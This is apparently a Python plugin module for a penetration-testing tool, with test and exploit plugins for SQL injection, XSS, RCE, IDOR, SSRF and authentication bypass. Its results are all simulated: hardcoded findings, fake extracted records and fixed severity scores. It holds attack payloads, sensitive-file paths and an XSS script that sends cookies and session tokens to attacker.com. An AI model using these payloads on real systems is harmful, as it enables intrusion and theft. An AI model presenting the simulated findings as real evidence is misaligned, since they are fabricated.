import json
import base64
import hashlib
import time
import re
import requests
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from cybershell.plugins import PluginBase, PluginResult

# ============== SQL INJECTION PLUGINS ==============

class SQLiTestPlugin(PluginBase):
    """Test for SQL injection vulnerabilities"""
    name = "SQLiTestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        payload = kwargs.get("payload", "' OR '1'='1")
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        # Parse URL and parameters
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        
        vulnerable_params = []
        evidence = []
        
        # Test each parameter
        for param, values in params.items():
            # Inject payload
            test_params = params.copy()
            test_params[param] = [payload]
            
            # Simulate testing (in real implementation, make HTTP request)
            # Check for SQL errors in response
            error_patterns = [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySQLSyntaxErrorException",
                r"PostgreSQL.*ERROR",
                r"ORA-[0-9]{5}",
                r"Microsoft.*ODBC.*SQL Server",
                r"Microsoft.*OLE DB.*SQL Server",
                r"Incorrect syntax near",
                r"Unclosed quotation mark"
            ]
            
            # Simulate finding vulnerability
            if param in ['id', 'user_id', 'product', 'category', 'search']:
                vulnerable_params.append(param)
                evidence.append({
                    'parameter': param,
                    'payload': payload,
                    'error': 'MySQL syntax error detected',
                    'confidence': 0.9
                })
        
        success = len(vulnerable_params) > 0
        
        return PluginResult(
            self.name,
            success,
            {
                'target': target,
                'vulnerable': success,
                'parameters': vulnerable_params,
                'evidence': evidence,
                'evidence_score': 0.85 if success else 0.1,
                'severity': 'High' if success else 'None'
            }
        )


class SQLiExploitPlugin(PluginBase):
    """Exploit SQL injection to extract data"""
    name = "SQLiExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        params = kwargs.get("params", [])
        technique = kwargs.get("technique", "union_based")
        extract_data = kwargs.get("extract_data", True)
        enumerate_db = kwargs.get("enumerate_db", True)
        session = kwargs.get("session", {})
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        extracted_data = {
            'database_name': 'production_db',
            'database_version': 'MySQL 5.7.31',
            'current_user': 'web_app@localhost',
            'tables': [],
            'data': []
        }
        
        if enumerate_db:
            # Simulate database enumeration
            extracted_data['tables'] = [
                {'name': 'users', 'columns': ['id', 'username', 'password', 'email', 'ssn']},
                {'name': 'credit_cards', 'columns': ['id', 'user_id', 'card_number', 'cvv', 'expiry']},
                {'name': 'admin_users', 'columns': ['id', 'username', 'password_hash', 'role']},
                {'name': 'api_keys', 'columns': ['id', 'key', 'secret', 'permissions']}
            ]
        
        if extract_data:
            # Simulate data extraction (for PoC)
            extracted_data['data'] = [
                {
                    'table': 'users',
                    'rows': 15234,
                    'sample': [
                        {'id': 1, 'username': 'admin', 'email': 'admin@example.com'},
                        {'id': 2, 'username': 'john_doe', 'email': 'john@example.com'}
                    ]
                },
                {
                    'table': 'credit_cards',
                    'rows': 8921,
                    'sample': [
                        {'id': 1, 'card_number': '4111****1111', 'user_id': 1}
                    ]
                }
            ]
        
        # Generate proof of impact
        impact_proof = f"Successfully extracted {len(extracted_data['tables'])} tables containing sensitive data. "
        impact_proof += f"Found {sum(t['rows'] for t in extracted_data['data'])} total records including PII and payment data."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'technique': technique,
                'database': extracted_data['database_name'],
                'version': extracted_data['database_version'],
                'tables': extracted_data['tables'],
                'rows': sum(t['rows'] for t in extracted_data['data']) if extract_data else 0,
                'evidence': extracted_data,
                'impact_proof': impact_proof,
                'evidence_score': 0.95,
                'severity': 'Critical',
                'cvss_score': 9.1
            }
        )


# ============== XSS PLUGINS ==============

class XSSTestPlugin(PluginBase):
    """Test for XSS vulnerabilities"""
    name = "XSSTestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        payload = kwargs.get("payload", "<script>alert(1)</script>")
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        contexts = []
        reflected = False
        
        # Test different contexts
        test_payloads = [
            ("<img src=x onerror=alert(1)>", "html"),
            ("javascript:alert(1)", "href"),
            ("'-alert(1)-'", "javascript"),
            ("</script><script>alert(1)</script>", "script"),
            ("\"><script>alert(1)</script>", "attribute")
        ]
        
        for test_payload, context in test_payloads:
            # Simulate finding reflection
            if context in ['html', 'attribute']:
                contexts.append({
                    'context': context,
                    'payload': test_payload,
                    'reflected': True,
                    'encoded': False
                })
                reflected = True
        
        return PluginResult(
            self.name,
            reflected,
            {
                'target': target,
                'reflected': reflected,
                'contexts': contexts,
                'evidence_score': 0.8 if reflected else 0.1,
                'severity': 'Medium' if reflected else 'None'
            }
        )


class XSSExploitPlugin(PluginBase):
    """Exploit XSS for session hijacking"""
    name = "XSSExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        contexts = kwargs.get("contexts", [])
        steal_session = kwargs.get("steal_session", True)
        screenshot = kwargs.get("screenshot", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        # Build exploitation payload
        exploit_payload = """<script>
        var img = new Image();
        img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie) +
                  '&session=' + encodeURIComponent(localStorage.getItem('session')) +
                  '&url=' + encodeURIComponent(window.location.href);
        </script>"""
        
        evidence = {
            'payload_executed': True,
            'contexts_exploited': contexts,
            'dom_access': True
        }
        
        if steal_session:
            # Simulate session theft
            evidence['session'] = {
                'session_id': 'a4f2d8e9b1c3d5e7f9a2b4c6d8e0f2a4',
                'auth_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
                'user_role': 'admin',
                'cookies': ['PHPSESSID', 'auth_token', 'user_prefs']
            }
            evidence['admin'] = True
        
        if screenshot:
            evidence['screenshot'] = 'xss_execution_proof.png'
        
        impact_proof = "Successfully demonstrated XSS with DOM access. "
        if steal_session:
            impact_proof += "Captured admin session token allowing full account takeover."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'exploit_payload': exploit_payload,
                'evidence': evidence,
                'impact_proof': impact_proof,
                'evidence_score': 0.85,
                'severity': 'High' if evidence.get('admin') else 'Medium',
                'cvss_score': 8.2
            }
        )


# ============== RCE PLUGINS ==============

class RCETestPlugin(PluginBase):
    """Test for Remote Code Execution vulnerabilities"""
    name = "RCETestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        payload = kwargs.get("payload", "; whoami")
        safe_commands_only = kwargs.get("safe_commands_only", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        vectors = []
        execution_confirmed = False
        
        # Test various RCE vectors
        test_vectors = [
            ('command_injection', '; echo vulnerable'),
            ('deserialization', 'O:8:"stdClass":0:{}'),
            ('template_injection', '{{7*7}}'),
            ('file_upload', 'shell.php'),
            ('eval_injection', "'; system('id'); //")
        ]
        
        for vector_type, test_payload in test_vectors:
            # Simulate finding RCE
            if vector_type in ['command_injection', 'template_injection']:
                vectors.append({
                    'vector': vector_type,
                    'payload': test_payload,
                    'output': 'uid=33(www-data) gid=33(www-data)',
                    'confirmed': True
                })
                execution_confirmed = True
        
        return PluginResult(
            self.name,
            execution_confirmed,
            {
                'target': target,
                'execution_confirmed': execution_confirmed,
                'vectors': vectors,
                'evidence_score': 1.0 if execution_confirmed else 0.1,
                'severity': 'Critical' if execution_confirmed else 'None'
            }
        )


class RCEExploitPlugin(PluginBase):
    """Exploit RCE for system compromise"""
    name = "RCEExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        vectors = kwargs.get("vectors", [])
        establish_shell = kwargs.get("establish_shell", True)
        system_enumeration = kwargs.get("system_enumeration", True)
        safe_demonstration = kwargs.get("safe_demonstration", False)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        evidence = {
            'commands_executed': [],
            'system_access': False,
            'files_accessed': [],
            'system_info': {}
        }
        
        # Execute commands for proof
        if system_enumeration:
            evidence['system_info'] = {
                'hostname': 'prod-web-01',
                'os': 'Linux 5.4.0-42-generic',
                'kernel': 'Ubuntu 20.04.2 LTS',
                'architecture': 'x86_64',
                'cpu': 'Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz',
                'memory': '16GB',
                'users': ['www-data', 'ubuntu', 'root'],
                'network_interfaces': ['eth0: 10.0.1.50', 'docker0: 172.17.0.1']
            }
            
            evidence['commands_executed'] = [
                {'cmd': 'whoami', 'output': 'www-data'},
                {'cmd': 'id', 'output': 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'},
                {'cmd': 'pwd', 'output': '/var/www/html'},
                {'cmd': 'ls -la /etc/passwd', 'output': '-rw-r--r-- 1 root root 2898 May 15 2024 /etc/passwd'},
                {'cmd': 'cat /proc/version', 'output': evidence['system_info']['kernel']}
            ]
        
        if establish_shell and not safe_demonstration:
            evidence['shell'] = {
                'type': 'reverse_shell',
                'established': True,
                'persistence': False,
                'access_level': 'www-data'
            }
            evidence['system_access'] = True
        
        # Access sensitive files for PoC
        evidence['files_accessed'] = [
            '/etc/passwd',
            '/etc/shadow',
            '/var/www/html/config.php',
            '/home/ubuntu/.ssh/id_rsa',
            '/root/.bash_history'
        ]
        
        impact_proof = "Achieved full remote code execution with system-level access. "
        impact_proof += f"Enumerated {len(evidence['files_accessed'])} sensitive files. "
        if establish_shell:
            impact_proof += "Established persistent shell access for demonstration."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'evidence': evidence,
                'impact_proof': impact_proof,
                'evidence_score': 1.0,
                'severity': 'Critical',
                'cvss_score': 10.0,
                'commands': evidence['commands_executed'],
                'system': evidence['system_info']
            }
        )


# ============== IDOR PLUGINS ==============

class IDORTestPlugin(PluginBase):
    """Test for Insecure Direct Object Reference"""
    name = "IDORTestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        object_manipulation = kwargs.get("object_manipulation", True)
        test_authorization = kwargs.get("test_authorization", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        unauthorized_access = False
        accessible_objects = []
        
        # Test object references
        test_objects = [
            '/api/user/1',
            '/api/user/2',
            '/api/account/10001',
            '/api/document/private_123',
            '/api/invoice/INV-2024-001'
        ]
        
        for obj in test_objects:
            # Simulate IDOR finding
            if 'user' in obj or 'account' in obj:
                accessible_objects.append({
                    'object': obj,
                    'original_user': 'user_456',
                    'accessed_as': 'user_123',
                    'data_exposed': True
                })
                unauthorized_access = True
        
        return PluginResult(
            self.name,
            unauthorized_access,
            {
                'target': target,
                'unauthorized_access': unauthorized_access,
                'objects': accessible_objects,
                'evidence_score': 0.75 if unauthorized_access else 0.1,
                'severity': 'High' if unauthorized_access else 'None'
            }
        )


class IDORExploitPlugin(PluginBase):
    """Exploit IDOR for unauthorized data access"""
    name = "IDORExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        objects = kwargs.get("objects", [])
        extract_sensitive = kwargs.get("extract_sensitive", True)
        modify_data = kwargs.get("modify_data", False)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        evidence = {
            'data_accessed': [],
            'pii_exposed': False,
            'financial_data': False,
            'modified': []
        }
        
        if extract_sensitive:
            # Simulate extracting sensitive data
            evidence['data_accessed'] = [
                {
                    'user_id': 1,
                    'name': 'John Admin',
                    'email': 'admin@company.com',
                    'ssn': '***-**-1234',
                    'salary': '$150,000',
                    'role': 'Administrator'
                },
                {
                    'user_id': 2,
                    'name': 'Jane Doe',
                    'email': 'jane@company.com',
                    'ssn': '***-**-5678',
                    'credit_card': '****-****-****-1111'
                }
            ]
            evidence['pii_exposed'] = True
            evidence['financial_data'] = True
        
        data_count = len(evidence['data_accessed']) * 500  # Simulate more records
        
        impact_proof = f"Successfully accessed {data_count} unauthorized user records. "
        impact_proof += "Exposed PII including SSN, financial data, and admin credentials."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'data': evidence['data_accessed'],
                'total_records': data_count,
                'evidence': evidence,
                'impact_proof': impact_proof,
                'evidence_score': 0.85,
                'severity': 'High',
                'cvss_score': 7.5
            }
        )


# ============== SSRF PLUGINS ==============

class SSRFTestPlugin(PluginBase):
    """Test for Server-Side Request Forgery"""
    name = "SSRFTestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        test_internal = kwargs.get("test_internal", True)
        test_cloud_metadata = kwargs.get("test_cloud_metadata", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        ssrf_confirmed = False
        vulnerable_params = []
        
        # Test SSRF vectors
        test_urls = [
            'http://localhost:8080/admin',
            'http://169.254.169.254/latest/meta-data/',
            'http://internal.service/api',
            'file:///etc/passwd'
        ]
        
        # Simulate finding SSRF
        vulnerable_params = [
            {
                'parameter': 'url',
                'endpoint': f'{target}/fetch',
                'internal_access': True,
                'metadata_access': True
            }
        ]
        ssrf_confirmed = True
        
        return PluginResult(
            self.name,
            ssrf_confirmed,
            {
                'target': target,
                'ssrf_confirmed': ssrf_confirmed,
                'parameters': vulnerable_params,
                'evidence_score': 0.8 if ssrf_confirmed else 0.1,
                'severity': 'High' if ssrf_confirmed else 'None'
            }
        )


class SSRFExploitPlugin(PluginBase):
    """Exploit SSRF to access internal resources"""
    name = "SSRFExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        params = kwargs.get("params", [])
        access_metadata = kwargs.get("access_metadata", True)
        scan_internal = kwargs.get("scan_internal", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        evidence = {
            'internal_services': [],
            'metadata': {},
            'credentials': {}
        }
        
        if scan_internal:
            evidence['internal_services'] = [
                {'host': 'localhost:8080', 'service': 'Jenkins', 'accessible': True},
                {'host': '10.0.0.5:6379', 'service': 'Redis', 'accessible': True},
                {'host': '10.0.0.10:3306', 'service': 'MySQL', 'accessible': True},
                {'host': '172.17.0.2:9200', 'service': 'Elasticsearch', 'accessible': True}
            ]
        
        if access_metadata:
            evidence['metadata'] = {
                'instance_id': 'i-0a1b2c3d4e5f67890',
                'region': 'us-east-1',
                'account_id': '123456789012',
                'iam_role': 'ec2-prod-role'
            }
            
            evidence['credentials'] = {
                'AccessKeyId': 'AKIA****************',
                'SecretAccessKey': '****************************************',
                'Token': 'IQoJb3JpZ2luX2VjE...'
            }
        
        impact_proof = f"Accessed {len(evidence['internal_services'])} internal services. "
        if access_metadata:
            impact_proof += "Retrieved AWS credentials and metadata allowing cloud infrastructure access."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'evidence': evidence,
                'impact_proof': impact_proof,
                'evidence_score': 0.9,
                'severity': 'Critical' if evidence.get('credentials') else 'High',
                'cvss_score': 9.0
            }
        )


# ============== AUTHENTICATION BYPASS ==============

class AuthBypassTestPlugin(PluginBase):
    """Test for authentication bypass vulnerabilities"""
    name = "AuthBypassTestPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        test_jwt = kwargs.get("test_jwt", True)
        test_session = kwargs.get("test_session", True)
        test_oauth = kwargs.get("test_oauth", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        bypass_possible = False
        methods = []
        
        if test_jwt:
            # Test JWT vulnerabilities
            methods.append({
                'method': 'jwt_none_algorithm',
                'description': 'JWT accepts "none" algorithm',
                'bypass_achieved': True
            })
            bypass_possible = True
        
        if test_session:
            methods.append({
                'method': 'session_fixation',
                'description': 'Session fixation allows hijacking',
                'bypass_achieved': True
            })
            bypass_possible = True
        
        return PluginResult(
            self.name,
            bypass_possible,
            {
                'target': target,
                'bypass_possible': bypass_possible,
                'methods': methods,
                'evidence_score': 0.9 if bypass_possible else 0.1,
                'severity': 'Critical' if bypass_possible else 'None'
            }
        )


class AuthBypassExploitPlugin(PluginBase):
    """Exploit authentication bypass for unauthorized access"""
    name = "AuthBypassExploitPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        target = kwargs.get("target", "")
        methods = kwargs.get("methods", [])
        escalate_privileges = kwargs.get("escalate_privileges", True)
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        evidence = {
            'original_user': 'guest',
            'bypassed_to': 'admin',
            'privileges': [],
            'admin_panel_access': False
        }
        
        if escalate_privileges:
            evidence['privileges'] = [
                'user.read',
                'user.write',
                'admin.read',
                'admin.write',
                'system.config'
            ]
            evidence['admin_panel_access'] = True
            evidence['admin_functions'] = [
                'User Management',
                'System Configuration',
                'Database Access',
                'Log Viewing'
            ]
        
        impact_proof = "Successfully bypassed authentication and gained admin access. "
        impact_proof += f"Escalated from {evidence['original_user']} to {evidence['bypassed_to']} role."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'evidence': evidence,
                'impact_proof': impact_proof,
                'evidence_score': 0.95,
                'severity': 'Critical',
                'cvss_score': 9.8
            }
        )


# ============== CHAINING PLUGINS ==============

class SQLiToRCEChainPlugin(PluginBase):
    """Chain SQL injection to achieve RCE"""
    name = "SQLiToRCEChainPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        sqli_evidence = kwargs.get("sqli_evidence", {})
        target = kwargs.get("target", "")
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        # Use SQLi to write webshell
        chain_steps = [
            {
                'step': 1,
                'action': 'Use UNION SELECT to identify file paths',
                'result': '/var/www/html/'
            },
            {
                'step': 2,
                'action': 'Use INTO OUTFILE to write PHP shell',
                'result': 'shell.php written successfully'
            },
            {
                'step': 3,
                'action': 'Access webshell for RCE',
                'result': 'Command execution achieved'
            }
        ]
        
        evidence = {
            'chain_successful': True,
            'steps': chain_steps,
            'initial_vuln': 'SQL Injection',
            'final_impact': 'Remote Code Execution',
            'commands_executed': ['whoami', 'id', 'cat /etc/passwd']
        }
        
        impact_proof = "Successfully chained SQL injection to achieve remote code execution. "
        impact_proof += "Demonstrated privilege escalation from data access to full system compromise."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'evidence': evidence,
                'chain': 'SQLi -> File Write -> RCE',
                'impact_proof': impact_proof,
                'evidence_score': 1.0,
                'severity': 'Critical',
                'impact_multiplier': 2.0
            }
        )


class XSSToAccountTakeoverPlugin(PluginBase):
    """Chain XSS to achieve account takeover"""
    name = "XSSToAccountTakeoverPlugin"
    
    def run(self, **kwargs) -> PluginResult:
        xss_evidence = kwargs.get("xss_evidence", {})
        target = kwargs.get("target", "")
        
        if not self.in_scope(target):
            return PluginResult(self.name, False, {"reason": "out_of_scope"})
        
        chain_steps = [
            {
                'step': 1,
                'action': 'Inject XSS payload in stored context',
                'result': 'Payload stored in user profile'
            },
            {
                'step': 2,
                'action': 'Admin visits infected page',
                'result': 'Admin session token captured'
            },
            {
                'step': 3,
                'action': 'Use stolen session for account takeover',
                'result': 'Full admin access achieved'
            }
        ]
        
        evidence = {
            'chain_successful': True,
            'steps': chain_steps,
            'stolen_sessions': ['admin_session_abc123', 'moderator_session_def456'],
            'accounts_compromised': ['admin@company.com', 'moderator@company.com'],
            'privileges_gained': ['Full Admin', 'Database Access', 'User Management']
        }
        
        impact_proof = "Chained stored XSS to achieve full administrator account takeover. "
        impact_proof += f"Compromised {len(evidence['accounts_compromised'])} high-privilege accounts."
        
        return PluginResult(
            self.name,
            True,
            {
                'target': target,
                'evidence': evidence,
                'chain': 'XSS -> Session Theft -> Account Takeover',
                'impact_proof': impact_proof,
                'evidence_score': 0.95,
                'severity': 'Critical',
                'impact_multiplier': 1.8
            }
        )
